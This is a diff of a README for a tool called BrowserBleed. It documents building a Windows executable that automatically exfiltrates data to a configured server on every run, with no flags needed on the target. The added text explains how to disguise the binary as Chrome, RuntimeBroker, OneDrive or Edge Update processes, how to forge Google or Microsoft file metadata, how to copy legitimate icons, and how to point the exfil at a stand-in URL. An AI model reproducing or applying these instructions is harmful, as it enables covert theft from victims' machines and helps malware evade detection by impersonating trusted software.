@@ -264,11 +264,43 @@ Follow the [Report Server](#report-server) deploy steps above. When done, `deplo
 .\build_windows.ps1
 ```
 
-Reads `DOMAIN` and `BB_API_KEY` from `deploy/config`, substitutes them into a temp copy of the source, and produces `BrowserBleed.exe` in the repo root. The exe auto-exfils on every run — no flags needed on target.
+Reads `DOMAIN` and `BB_API_KEY` from `deploy/config`, substitutes them into a temp copy of the source, and produces the exe in the repo root. The exe auto-exfils on every run — no flags needed on target.
 
-To point at a different server without editing config:
+**Disguising the binary** — the build script controls the filename, process name (Task Manager), and the metadata shown in File Explorer Properties. Presets are included for common processes so the right company/description are auto-populated:
+
 ```powershell
-.\build_windows.ps1 -ExfilUrl https://reports.example.com -ExfilKey mykey
+# Default — blends into Chrome's existing process list
+.\build_windows.ps1
+# Produces: chrome_crashpad_handler.exe
+# Properties: Google LLC — Google Chrome
+
+.\build_windows.ps1 -ExeName RuntimeBroker
+# Produces: RuntimeBroker.exe
+# Properties: Microsoft Corporation — Runtime Broker
+
+.\build_windows.ps1 -ExeName MicrosoftEdgeUpdate
+.\build_windows.ps1 -ExeName OneDrive
+.\build_windows.ps1 -ExeName SearchIndexer
+```
+
+**Adding an icon** — pass any `.ico` or `.exe` to copy the icon from:
+
+```powershell
+# Use Chrome's own icon (looks identical in Explorer)
+.\build_windows.ps1 -IconFile "C:\Program Files\Google\Chrome\Application\chrome.exe"
+
+# Use a custom .ico file
+.\build_windows.ps1 -ExeName RuntimeBroker -IconFile "C:\path\to\icon.ico"
+```
+
+**Full override example:**
+
+```powershell
+.\build_windows.ps1 `
+    -ExeName MicrosoftEdgeUpdate `
+    -IconFile "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" `
+    -ExfilUrl https://reports.example.com `
+    -ExfilKey mykey
 ```
 
 ### Step 3 — Build for macOS
